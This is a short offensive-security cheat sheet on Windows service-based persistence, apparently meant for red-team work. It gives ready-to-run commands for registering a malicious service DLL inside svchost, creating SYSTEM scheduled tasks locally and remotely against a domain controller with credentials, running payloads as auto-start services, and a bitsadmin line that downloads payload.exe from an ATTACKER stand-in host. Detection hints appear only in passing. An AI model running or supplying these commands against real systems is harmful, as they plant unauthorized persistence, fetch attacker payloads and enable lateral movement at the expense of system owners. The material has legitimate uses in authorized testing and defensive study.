---
description: Service DLL, schtasks, BITS jobs
---

# Service-Based Persistence

## Service DLL in svchost.exe
1. Compile service DLL implementing `ServiceMain` export
2. Create service: `sc create EvilSvc binPath= "svchost.exe -k netsvcs" type= share start= auto`
3. Add ServiceDll registry value:
   `reg add HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\path\evil.dll`
4. Add service to svchost group (APPEND, do not overwrite):
   ```powershell
   # Read existing values first, then append
   $existing = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost").netsvcs
   Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" -Name netsvcs -Value ($existing + "EvilSvc")
   ```
   WARNING: Using `reg add /t REG_MULTI_SZ /d "EvilSvc"` will OVERWRITE the entire list and break all existing svchost services.

## Scheduled Tasks (T1053.005)
```cmd
# Local persistence
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\payload.exe /ru "SYSTEM"
# Remote lateral movement
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s DC01 /u user /p pass
```
- Detection: Event 4698 (new task created), parent process taskeng.exe

## BITS Jobs (T1197)
```cmd
bitsadmin /transfer myjob /download /priority high http://ATTACKER/payload.exe c:\temp\payload.exe
```
- Can be used for persistent download + execution
- Check: `bitsadmin /list /allusers /verbose`

## Service Execution (T1569.002)
```cmd
sc create evilsvc binpath= "c:\payload.exe" start= auto
sc start evilsvc
```
